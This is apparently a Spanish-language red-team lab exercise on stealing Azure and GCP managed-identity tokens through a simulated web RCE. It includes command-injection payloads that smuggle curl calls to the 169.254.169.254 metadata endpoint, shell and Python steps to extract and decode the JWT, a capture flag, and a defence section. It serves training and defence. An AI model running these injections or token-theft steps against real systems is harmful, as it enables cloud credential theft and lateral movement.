# 16 - Tokens de identidad de Azure y GCP

**Clase 4 · 20 min · M6 Cloud (Azure/GCP)**
**Fase:** robo de identidad cloud
**MITRE ATT&CK:** T1552.005 (Cloud Instance Metadata API), T1528 (Steal Application Access Token)
**Riesgo OWASP CI/CD:** CICD-SEC-2 (identidad y acceso), CICD-SEC-6 (higiene de credenciales)

## Escenario

El mismo RCE del lab 15 sirve para las otras dos nubes. Azure usa un endpoint de
managed identity; GCP usa el metadata server con `Metadata-Flavor: Google`. En
ambos casos el token es una credencial portadora: quien lo tiene llama a la API
sin usuario ni password.

El material original usa cuentas reales. Aqui el endpoint esta simulado en el
mismo contenedor de la webapp, con la misma forma que el IMDS real.

## Objetivo de aprendizaje

- Pedir un token de identidad a traves del RCE.
- Decodificar un JWT y leer sus claims (tenant, object id, app id, expiracion).
- Entender que el token es suficiente para movimiento lateral.

## Antes de empezar

```bash
cd devops-redteam
curl -s http://localhost:8000/health
```

## Azure

### Paso 1 - Pedir el token

En Azure real la peticion lleva `Metadata: true` y
`?api-version=2018-02-01&resource=https://management.azure.com/`. Aqui el mock
responde a la ruta corta:

```bash
curl -s -G --data-urlencode \
  'host=127.0.0.1;curl -s http://169.254.169.254/azure/token' \
  http://localhost:8000/update
```

**Que esperar:** el `ping` y un JSON con `access_token`, `expires_in` y
`token_type`. El token es un JWT con `alg: none` (no hay firma que validar).

### Paso 2 - Separar el token

```bash
TOKEN=$(curl -s -G --data-urlencode \
  'host=127.0.0.1;curl -s http://169.254.169.254/azure/token' \
  http://localhost:8000/update \
  | grep -o '"access_token": "[^"]*"' | cut -d'"' -f4)
echo "${TOKEN:0:20}..."
```

### Paso 3 - Leer los claims

```bash
python3 - "$TOKEN" <<'PY'
import base64, json, sys
p = sys.argv[1].split(".")[1]
p += "=" * (-len(p) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2))
PY
```

**Que esperar:**

```json
{
  "aud": "https://management.azure.com/",
  "tid": "11111111-1111-1111-1111-111111111111",
  "oid": "22222222-2222-2222-2222-222222222222",
  "sub": "lab-managed-identity",
  "appid": "33333333-3333-3333-3333-333333333333",
  "exp": 1900000000,
  "flag": "FLAG{cloud_identity_token}"
}
```

**Que significa cada claim:**

| Claim | Uso para el atacante |
|---|---|
| `aud` | a que API puede llamar el token |
| `tid` | tenant de Azure |
| `oid` | identidad concreta (para saber que permisos tiene) |
| `appid` | aplicacion asociada |
| `exp` | cuanto tiempo queda |

La firma no importa para el atacante: el token ya lo emitio la plataforma. Se
usa tal cual contra `management.azure.com` con `Authorization: Bearer <token>`.

## GCP

### Paso 1 - Pedir el token

En GCP real se usa `metadata.google.internal` con `Metadata-Flavor: Google`:

```bash
curl -s -G --data-urlencode \
  'host=127.0.0.1;curl -s http://169.254.169.254/computeMetadata/v1/instance/service-accounts' \
  http://localhost:8000/update
```

**Que esperar:** un JSON con `access_token` tipo `ya29...`, `expires_in` y
`token_type: Bearer`.

El token de GCP se usa igual: `Authorization: Bearer <token>` contra las APIs de
Google Cloud. La diferencia es el endpoint y la cabecera, no el concepto.

## Evidencia para el informe

- Peticion al IMDS a traves del RCE (Azure y GCP).
- Token decodificado con `aud`, `tid`, `oid` y `exp` (redacta el token).
- Explicacion de a que API daria acceso cada `aud`.
- Comparacion: que cambia entre AWS, Azure y GCP y que no.

## Checkpoint

1. Por que no hace falta verificar la firma del JWT para usarlo?
2. Que claim te dice si el token sirve para management o solo para storage?
3. Que control de Azure/GCP reduce el impacto de un token robado?

## Defensa

- Bloquear el link-local metadata desde contenedores que no lo necesitan.
- Managed identity solo donde haga falta, con RBAC minimo y scope por recurso.
- Conditional Access / workload identity federation; tokens de vida corta.
- Auditar emision y uso anomalo de tokens (IP, user agent, resource).
- En GCP: Workload Identity, no claves de service account; en Azure:
  federated credentials.
- Corregir el RCE de la app: nada de `shell=True` con entrada del usuario.
